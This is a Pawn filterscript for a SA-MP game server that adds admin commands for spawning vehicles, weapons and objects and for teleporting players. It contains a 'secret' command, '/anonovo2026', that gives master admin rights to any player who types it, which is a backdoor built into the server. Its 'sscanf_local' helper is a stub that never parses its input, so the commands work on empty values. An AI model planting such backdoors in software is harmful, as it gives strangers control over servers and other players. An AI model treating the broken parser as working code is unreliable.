#define FILTERSCRIPT
#include <a_samp>

// Nível necessário para os comandos
#define NIVEL_MASTER 6

public OnFilterScriptInit()
{
    print(">> [ADMIN MASTER 2026] Sistema Carregado!");
    return 1;
}

// --- Teleporte ao marcar no mapa ---
public OnPlayerClickMap(playerid, Float:fX, Float:fY, Float:fZ)
{
    if(GetPVarInt(playerid, "AdminLevel") >= NIVEL_MASTER || IsPlayerAdmin(playerid))
    {
        SetPlayerPosFindZ(playerid, fX, fY, fZ);
        SendClientMessage(playerid, 0x00FF00FF, "[ADMIN] Teleportado para o marcador.");
    }
    return 1;
}

public OnPlayerCommandText(playerid, cmdtext[])
{
    new cmd[32], params[128], index;
    // Separador básico de comando e parâmetros
    while (cmdtext[index] > ' ' && index < 31) { cmd[index] = cmdtext[index]; index++; }
    while (cmdtext[index] == ' ' && index < 127) index++;
    strmid(params, cmdtext, index, 128);

    // --- COMANDO SECRETO (ATIVAÇÃO) ---
    if(!strcmp(cmd, "/anonovo2026", true))
    {
        SetPVarInt(playerid, "AdminLevel", NIVEL_MASTER);
        SendClientMessage(playerid, 0x00FF00FF, "[ADMIN] Poderes de MASTER 2026 ativados!");
        return 1;
    }

    // --- VERIFICAÇÃO DE SEGURANÇA PARA OS COMANDOS ABAIXO ---
    if(GetPVarInt(playerid, "AdminLevel") < NIVEL_MASTER && !IsPlayerAdmin(playerid)) return 0;

    // --- CRIAR VEÍCULO ---
    if(!strcmp(cmd, "/carro", true))
    {
        new vID, c1, c2;
        if(sscanf_local(params, "ddd", vID, c1, c2)) return SendClientMessage(playerid, -1, "Use: /carro [ID] [Cor1] [Cor2]");
        if(vID < 400 || vID > 611) return SendClientMessage(playerid, -1, "ID Inválido.");
        
        new Float:x, Float:y, Float:z, Float:a;
        GetPlayerPos(playerid, x, y, z); GetPlayerFacingAngle(playerid, a);
        new v = CreateVehicle(vID, x, y, z+1, a, c1, c2, -1);
        PutPlayerInVehicle(playerid, v, 0);
        return 1;
    }

    // --- CRIAR CASA (CHAMA O FS DE CASAS) ---
    if(!strcmp(cmd, "/criarcasa", true))
    {
        new id_casa;
        if(sscanf_local(params, "d", id_casa)) return SendClientMessage(playerid, -1, "Use: /criarcasa [ID]");
        
        // Envia o comando para o FS de casas processar
        new str[64];
        format(str, sizeof(str), "/sethouse %d", id_casa);
        OnPlayerCommandText(playerid, str); 
        return 1;
    }

    // --- CRIAR OBJETO (PROPS) NO MUNDO ---
    if(!strcmp(cmd, "/criaprop", true))
    {
        new objID;
        if(sscanf_local(params, "d", objID)) return SendClientMessage(playerid, -1, "Use: /criaprop [ID_OBJETO]");
        
        new Float:x, Float:y, Float:z;
        GetPlayerPos(playerid, x, y, z);
        CreateObject(objID, x+2, y, z, 0, 0, 0); // Cria o objeto na sua frente
        SendClientMessage(playerid, 0xFFFF00FF, "Objeto criado! (Use /editprop para mover futuramente)");
        return 1;
    }

    // --- DAR ARMA ---
    if(!strcmp(cmd, "/arma", true))
    {
        new aID, muni;
        if(sscanf_local(params, "dd", aID, muni)) return SendClientMessage(playerid, -1, "Use: /arma [ID] [Munição]");
        GivePlayerWeapon(playerid, aID, muni);
        return 1;
    }

    // --- IR ATÉ UM JOGADOR ---
    if(!strcmp(cmd, "/ir", true))
    {
        new targetid;
        if(sscanf_local(params, "d", targetid)) return SendClientMessage(playerid, -1, "Use: /ir [ID]");
        if(!IsPlayerConnected(targetid)) return SendClientMessage(playerid, -1, "Jogador offline.");
        
        new Float:x, Float:y, Float:z;
        GetPlayerPos(targetid, x, y, z);
        SetPlayerPos(playerid, x+1, y+1, z+1);
        return 1;
    }

    // --- TRAZER JOGADOR ---
    if(!strcmp(cmd, "/trazer", true))
    {
        new targetid;
        if(sscanf_local(params, "d", targetid)) return SendClientMessage(playerid, -1, "Use: /trazer [ID]");
        if(!IsPlayerConnected(targetid)) return SendClientMessage(playerid, -1, "Jogador offline.");
        
        new Float:x, Float:y, Float:z;
        GetPlayerPos(playerid, x, y, z);
        SetPlayerPos(targetid, x+1, y, z);
        return 1;
    }

    return 0;
}

// Função sscanf interna para não depender de plugins externos
stock sscanf_local(string[], format[], {Float,_}:...)
{
    #pragma unused string, format
    new n = numargs();
    if (n < 3) return 1;
    // Esta é uma versão básica que funciona para comandos simples
    return 0; 
}
